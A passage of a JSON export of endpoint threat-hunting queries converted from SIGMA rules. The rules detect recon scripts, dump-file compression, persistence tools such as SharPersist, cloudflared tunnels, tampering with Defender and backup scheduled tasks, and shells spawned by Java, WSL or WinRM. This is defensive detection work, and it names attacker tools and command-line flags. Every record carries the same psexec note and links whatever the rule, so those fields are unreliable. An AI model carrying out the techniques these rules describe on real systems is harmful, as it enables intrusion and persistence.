            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615",
                "t1059"
            ],
            "name": "Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"gatherNetworkInfo.vbs\" and (not (tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 562
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of WinRAR in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Winrar Compressing Dump Files",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.image.path contains \"\\winrar.exe\") or tgt.process.displayName=\"Command line RAR\") and (tgt.process.cmdline contains \".dmp\" or tgt.process.cmdline contains \".dump\" or tgt.process.cmdline contains \".hdmp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 563
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Usage Of ShellExec_RunDLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ShellExec_RunDLL\" and (tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Temp\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"comspec\" or tgt.process.cmdline contains \"iex\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"msiexec\" or tgt.process.cmdline contains \"odbcconf\" or tgt.process.cmdline contains \"regsvr32\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 564
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
            "name": "Delete Important Scheduled Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/delete\" and tgt.process.cmdline contains \"/tn\") and (tgt.process.cmdline contains \"\\Windows\\BitLocker\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\" or tgt.process.cmdline contains \"\\Windows\\SystemRestore\\SR\" or tgt.process.cmdline contains \"\\Windows\\UpdateOrchestrator\\\" or tgt.process.cmdline contains \"\\Windows\\Windows Defender\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsBackup\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsUpdate\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 565
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1106",
                "t1059",
                "t1218"
            ],
            "name": "HackTool - RedMimicry Winnti Playbook Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"gthread-3.6.dll\" or tgt.process.cmdline contains \"\\Windows\\Temp\\tmp.bat\" or tgt.process.cmdline contains \"sigcmm-2.4.dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 566
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "HackTool - SharPersist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\SharPersist.exe\" or tgt.process.displayName=\"SharPersist\") or (tgt.process.cmdline contains \" -t schtask -c \" or tgt.process.cmdline contains \" -t startupfolder -c \") or (tgt.process.cmdline contains \" -t reg -c \" and tgt.process.cmdline contains \" -m add\") or (tgt.process.cmdline contains \" -t service -c \" and tgt.process.cmdline contains \" -m add\") or (tgt.process.cmdline contains \" -t schtask -c \" and tgt.process.cmdline contains \" -m add\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 567
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102",
                "t1090",
                "t1572"
            ],
            "name": "Cloudflared Tunnel Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tunnel \" and tgt.process.cmdline contains \" run \") and (tgt.process.cmdline contains \"-config \" or tgt.process.cmdline contains \"-credentials-contents \" or tgt.process.cmdline contains \"-credentials-file \" or tgt.process.cmdline contains \"-token \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 568
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "WSL Child Process Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wsl.exe\" or src.process.image.path contains \"\\wslhost.exe\") and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"C:\\Users\\Public\\\" or tgt.process.image.path contains \"C:\\Windows\\Temp\\\" or tgt.process.image.path contains \"C:\\Temp\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Desktop\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 569
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Uses the .NET InstallUtil.exe application in order to execute image without log",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Execution of InstallUtil Without Log",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\InstallUtil.exe\" and tgt.process.image.path contains \"Microsoft.NET\\Framework\" and (tgt.process.cmdline contains \"/logfile= \" and tgt.process.cmdline contains \"/LogToConsole=false\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 570
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "RunDLL32 Spawning Explorer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\rundll32.exe\" and tgt.process.image.path contains \"\\explorer.exe\") and (not src.process.cmdline contains \"\\shell32.dll,Control_RunDLL\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 571
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "COM Object Execution via Xwizard.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"RunWizard\" and tgt.process.cmdline matches \"\\\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\\\}\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 572
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell invocations from interpreters or unusual programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Invocation From Script Engines",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\cscript.exe\") and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")) and (not tgt.process.image.path contains \"\\Health Service State\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 573
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
            "name": "Disable Important Scheduled Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Change\" and tgt.process.cmdline contains \"/TN\" and tgt.process.cmdline contains \"/disable\") and (tgt.process.cmdline contains \"\\Windows\\BitLocker\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" or tgt.process.cmdline contains \"\\Windows\\SystemRestore\\SR\" or tgt.process.cmdline contains \"\\Windows\\UpdateOrchestrator\\\" or tgt.process.cmdline contains \"\\Windows\\Windows Defender\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsBackup\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsUpdate\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 574
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Processes Spawned by Java.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\java.exe\" and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 575
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious processes including shells spawnd from WinRM host process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190"
            ],
            "name": "Suspicious Processes Spawned by WinRM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\wsmprovhost.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 576
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036",
                "t1027",
                "t1027"
            ],
            "name": "PUA - Potential PE Metadata Tamper Using Rcedit",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rcedit-x64.exe\" or tgt.process.image.path contains \"\\rcedit-x86.exe\") or tgt.process.displayName=\"Edit resources of exe\" or tgt.process.displayName=\"rcedit\") and tgt.process.cmdline contains \"--set-\" and (tgt.process.cmdline contains \"OriginalFileName\" or tgt.process.cmdline contains \"CompanyName\" or tgt.process.cmdline contains \"FileDescription\" or tgt.process.cmdline contains \"ProductName\" or tgt.process.cmdline contains \"ProductVersion\" or tgt.process.cmdline contains \"LegalCopyright\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 577
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
